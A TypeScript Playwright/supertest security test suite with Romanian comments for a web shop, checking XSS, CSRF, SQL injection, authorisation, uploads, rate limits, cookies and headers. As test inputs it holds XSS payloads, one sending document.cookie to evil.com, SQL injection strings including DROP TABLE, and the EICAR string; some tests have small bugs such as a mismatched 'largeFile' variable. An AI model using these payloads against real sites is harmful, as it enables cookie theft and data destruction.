/**
 * Security Tests
 * Tests pentru vulnerabilități XSS, CSRF, SQL Injection, etc.
 */

import { test, expect } from '@playwright/test';
import request from 'supertest';

const API_URL = process.env.API_URL || 'http://localhost:3000';

describe('XSS (Cross-Site Scripting) Tests', () => {
  test('previne XSS în input-uri text', async ({ page }) => {
    await page.goto('/products');
    
    const searchInput = page.locator('[data-testid="search-input"]');
    
    if (await searchInput.isVisible()) {
      // Încearcă XSS payload
      const xssPayload = '<script>alert("XSS")</script>';
      await searchInput.fill(xssPayload);
      await page.keyboard.press('Enter');
      
      // Verifică că script-ul NU s-a executat
      page.on('dialog', () => {
        throw new Error('XSS vulnerability detected!');
      });
      
      await page.waitForTimeout(2000);
      
      // Verifică că payload-ul este escape-uit în DOM
      const content = await page.content();
      expect(content).not.toContain('<script>alert("XSS")</script>');
      expect(content).toContain('&lt;script&gt;');
    }
  });

  test('previne XSS în comentarii/reviews', async ({ page }) => {
    await page.goto('/products/test-product');
    
    const reviewInput = page.locator('[data-testid="review-input"]');
    
    if (await reviewInput.isVisible()) {
      const xssPayload = '<img src=x onerror="alert(1)">';
      await reviewInput.fill(xssPayload);
      await page.click('[data-testid="submit-review-btn"]');
      
      page.on('dialog', () => {
        throw new Error('XSS vulnerability in reviews!');
      });
      
      await page.waitForTimeout(2000);
    }
  });

  test('sanitizează HTML în editor', async ({ page }) => {
    await page.goto('/editor');
    
    const textInput = page.locator('[data-testid="text-input"]');
    
    if (await textInput.isVisible()) {
      const xssPayload = '<script>fetch("http://evil.com?cookie=" + document.cookie)</script>';
      await textInput.fill(xssPayload);
      
      // Verifică că nu se execută
      page.on('request', (request) => {
        if (request.url().includes('evil.com')) {
          throw new Error('XSS vulnerability - data exfiltration!');
        }
      });
      
      await page.click('[data-testid="save-design-btn"]');
      await page.waitForTimeout(2000);
    }
  });
});

describe('CSRF (Cross-Site Request Forgery) Tests', () => {
  it('necesită CSRF token pentru POST requests', async () => {
    const response = await request(API_URL)
      .post('/api/admin/products')
      .send({
        name: 'Test Product',
        price: 99.99,
      });

    // Ar trebui să necesite token CSRF
    expect([401, 403]).toContain(response.status);
  });

  it('validează CSRF token în header', async () => {
    const response = await request(API_URL)
      .post('/api/admin/products')
      .set('X-CSRF-Token', 'invalid-token')
      .send({
        name: 'Test Product',
      });

    expect([401, 403]).toContain(response.status);
  });

  test('verifică că formularele au CSRF token', async ({ page }) => {
    await page.goto('/checkout');
    
    // Verifică că există input hidden cu CSRF token
    const csrfInput = page.locator('input[name="csrfToken"]');
    const csrfMeta = page.locator('meta[name="csrf-token"]');
    
    const hasCsrf = (await csrfInput.count()) > 0 || (await csrfMeta.count()) > 0;
    expect(hasCsrf).toBe(true);
  });
});

describe('SQL Injection Tests', () => {
  it('previne SQL injection în search', async () => {
    const sqlPayload = "' OR '1'='1";
    
    const response = await request(API_URL)
      .get('/api/products')
      .query({ search: sqlPayload });

    // Nu ar trebui să returneze toate produsele
    expect(response.status).toBe(200);
    // Verifică că nu execută SQL raw
  });

  it('previne SQL injection în parametri URL', async () => {
    const sqlPayload = "1; DROP TABLE products;--";
    
    const response = await request(API_URL).get(`/api/products/${sqlPayload}`);

    expect([400, 404]).toContain(response.status);
  });

  it('previne SQL injection în filtre', async () => {
    const response = await request(API_URL)
      .get('/api/orders')
      .query({
        status: "PENDING' OR '1'='1",
      });

    expect([200, 400]).toContain(response.status);
    // Verifică că răspunsul nu conține toate comenzile
  });
});

describe('Authentication & Authorization Tests', () => {
  it('protejează rute admin', async () => {
    const response = await request(API_URL).get('/api/admin/orders');

    expect(response.status).toBe(401);
  });

  it('previne escalare privilegii', async () => {
    // User normal încearcă să acceseze admin
    const response = await request(API_URL)
      .get('/api/admin/users')
      .set('Authorization', 'Bearer USER_TOKEN');

    expect([401, 403]).toContain(response.status);
  });

  it('invalidează sesiuni expirate', async () => {
    const expiredToken = 'expired.jwt.token';
    
    const response = await request(API_URL)
      .get('/api/orders')
      .set('Authorization', `Bearer ${expiredToken}`);

    expect(response.status).toBe(401);
  });

  test('nu expune date sensibile în răspunsuri', async ({ page }) => {
    await page.goto('/api/users/profile');
    
    const content = await page.content();
    
    // Nu ar trebui să conțină parole, token-uri, etc.
    expect(content).not.toMatch(/password/i);
    expect(content).not.toMatch(/jwt/i);
    expect(content).not.toMatch(/secret/i);
  });
});

describe('File Upload Security Tests', () => {
  test('acceptă doar tipuri de fișiere permise', async ({ page }) => {
    await page.goto('/editor');
    
    // Încearcă să încarce un fișier .exe
    const fileInput = page.locator('input[type="file"]');
    
    if (await fileInput.isVisible()) {
      // Setează un fișier invalid
      await fileInput.setInputFiles({
        name: 'virus.exe',
        mimeType: 'application/x-msdownload',
        buffer: Buffer.from('fake exe content'),
      });
      
      // Ar trebui să afișeze eroare
      await expect(
        page.locator('text=/invalid file|file type not allowed/i')
      ).toBeVisible({ timeout: 5000 });
    }
  });

  test('validează dimensiunea fișierelor', async ({ page }) => {
    await page.goto('/editor');
    
    const fileInput = page.locator('input[type="file"]');
    
    if (await fileInput.isVisible()) {
      // Fișier foarte mare (simulat)
      const largefile = Buffer.alloc(50 * 1024 * 1024); // 50MB
      
      await fileInput.setInputFiles({
        name: 'large-image.jpg',
        mimeType: 'image/jpeg',
        buffer: largeFile.slice(0, 1000), // Doar pentru test
      });
      
      // Ar trebui să valideze dimensiunea
      const error = page.locator('text=/file too large|fișier prea mare/i');
      // Poate sau nu să apară în funcție de implementare
    }
  });

  it('scanează fișiere pentru malware (mock)', async () => {
    // În producție ar folosi un scanner real (ClamAV, VirusTotal)
    const maliciousFile = Buffer.from('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*');
    
    // Simulare upload
    const response = await request(API_URL)
      .post('/api/upload')
      .attach('file', maliciousFile, 'eicar.txt');

    // Ar trebui să respingă fișiere malițioase
    expect([400, 403]).toContain(response.status);
  });
});

describe('Rate Limiting Tests', () => {
  it('limitează numărul de requests', async () => {
    const requests = Array(100)
      .fill(null)
      .map(() => request(API_URL).get('/api/products'));

    const responses = await Promise.all(requests);

    // Cel puțin unele ar trebui să fie rate limited
    const rateLimited = responses.filter((r) => r.status === 429);
    expect(rateLimited.length).toBeGreaterThan(0);
  });

  it('limitează login attempts', async () => {
    const attempts = Array(10)
      .fill(null)
      .map(() =>
        request(API_URL)
          .post('/api/auth/signin')
          .send({
            email: 'test@example.com',
            password: 'wrong-password',
          })
      );

    const responses = await Promise.all(attempts);

    // Ar trebui să blocheze după X încercări
    const blocked = responses.filter((r) => r.status === 429);
    expect(blocked.length).toBeGreaterThan(0);
  });
});

describe('Session Security Tests', () => {
  test('setează cookie-uri secure', async ({ page }) => {
    await page.goto('/');
    
    const cookies = await page.context().cookies();
    
    cookies.forEach((cookie) => {
      // Verifică atribute de securitate
      if (cookie.name.includes('session') || cookie.name.includes('auth')) {
        expect(cookie.httpOnly).toBe(true);
        expect(cookie.secure).toBe(true); // În producție
        expect(cookie.sameSite).toMatch(/Strict|Lax/);
      }
    });
  });

  test('invalidează sesiunea la logout', async ({ page }) => {
    // Login
    await page.goto('/auth/signin');
    await page.fill('[name="email"]', 'test@example.com');
    await page.fill('[name="password"]', 'password123');
    await page.click('[data-testid="signin-btn"]');
    
    await page.waitForURL(/\/dashboard/);
    
    // Logout
    await page.click('[data-testid="logout-btn"]');
    
    // Încearcă să accesezi o rută protejată
    await page.goto('/api/orders');
    
    // Ar trebui să redirecteze la login
    await expect(page).toHaveURL(/\/auth\/signin/);
  });
});

describe('Content Security Policy (CSP) Tests', () => {
  test('verifică CSP headers', async ({ page }) => {
    const response = await page.goto('/');
    
    const headers = response?.headers();
    
    if (headers) {
      // Verifică prezența CSP header
      const csp = headers['content-security-policy'];
      
      if (csp) {
        expect(csp).toContain("default-src 'self'");
        // Nu ar trebui să permită 'unsafe-inline' pentru scripturi
        expect(csp).not.toContain("script-src 'unsafe-inline'");
      }
    }
  });
});

describe('Data Exposure Tests', () => {
  it('nu expune informații în error messages', async () => {
    const response = await request(API_URL).get('/api/products/999999');

    expect(response.status).toBe(404);
    
    // Nu ar trebui să conțină stack traces sau detalii interne
    const body = JSON.stringify(response.body);
    expect(body).not.toMatch(/at.*\.ts:/); // Stack trace
    expect(body).not.toMatch(/node_modules/);
    expect(body).not.toMatch(/prisma/i);
  });

  it('nu expune structure DB în răspunsuri', async () => {
    const response = await request(API_URL).get('/api/products');

    if (response.status === 200 && response.body.length > 0) {
      const product = response.body[0];
      
      // Nu ar trebui să conțină câmpuri interne
      expect(product).not.toHaveProperty('password');
      expect(product).not.toHaveProperty('passwordHash');
      expect(product).not.toHaveProperty('salt');
    }
  });
});

describe('Clickjacking Protection Tests', () => {
  test('verifică X-Frame-Options header', async ({ page }) => {
    const response = await page.goto('/');
    
    const headers = response?.headers();
    
    if (headers) {
      const frameOptions = headers['x-frame-options'];
      expect(frameOptions).toMatch(/DENY|SAMEORIGIN/i);
    }
  });
});
